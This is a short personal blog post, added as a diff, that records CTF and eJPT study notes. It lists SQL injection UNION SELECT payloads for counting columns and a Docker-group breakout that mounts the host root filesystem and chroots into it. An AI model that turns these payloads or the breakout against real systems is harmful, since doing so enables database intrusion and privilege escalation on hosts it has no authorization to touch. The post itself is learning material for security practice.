@@ -1,0 +1,71 @@
+---
+title:  Stealing all the Cookies...
+categories:
+  - blog
+tags:
+    - SQLi
+    - XSS
+---
+
+<p>
+As mentioned before, I discoverd a major blindspot on the Basic SQLi. how to perform Union Based enumeration.
+Yes thanks for THM to show me how weak my game is there :)
+</p>
+
+<p>
+So I spend some time on INE eJPT path, to really get into the basics again&#x2026;. and yes it's quite simple if you know and now I know.
+</p>
+
+<p>
+I quess this is a Enumeration methoth anyone can remember :)
+</p>
+
+<p>
+<code>' UNION SELECT NULL--</code>
+<code>' UNION SELECT NULL,NULL--</code>
+<code>' UNION SELECT NULL,NULL,NULL--</code>
+</p>
+
+<p>
+<code>' UNION SELECT 'a',NULL,NULL,NULL--</code>
+<code>' UNION SELECT NULL,'a',NULL,NULL--</code>
+<code>' UNION SELECT NULL,NULL,'a',NULL--</code>
+<code>' UNION SELECT NULL,NULL,NULL,'a'--</code>
+</p>
+
+<p>
+More info can be found here:
+<a href="https://portswigger.net/web-security/sql-injection/union-attacks">https://portswigger.net/web-security/sql-injection/union-attacks</a>
+</p>
+
+
+<p>
+I spend some time on a CFT on THM, and finally made it. Learning some pritty cool stuff on excaping a docker container.
+</p>
+
+<p>
+Reference:
+<a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation</a>
+</p>
+
+<p>
+Basically if you are in the docker group, you can do the following:
+</p>
+
+<p>
+<code>#Search the socket</code>
+<code>find / -name docker.sock 2&gt;/dev/null</code>
+<code>#It's usually in /run/docker.sock</code>
+</p>
+
+<p>
+If found, than generate a new image, and mount the host filesystem into you image and chroot into it&#x2026; thats a pretty nice.
+Although not that realistic I guess, but good for CTFs
+</p>
+
+<p>
+<code>#List images to use one</code>
+<code>docker images</code>
+<code>#Run the image mounting the host disk and chroot on it</code>
+<code>docker run -it -v /:/host/ ubuntu:18.04 chroot /host</code>
+</p>
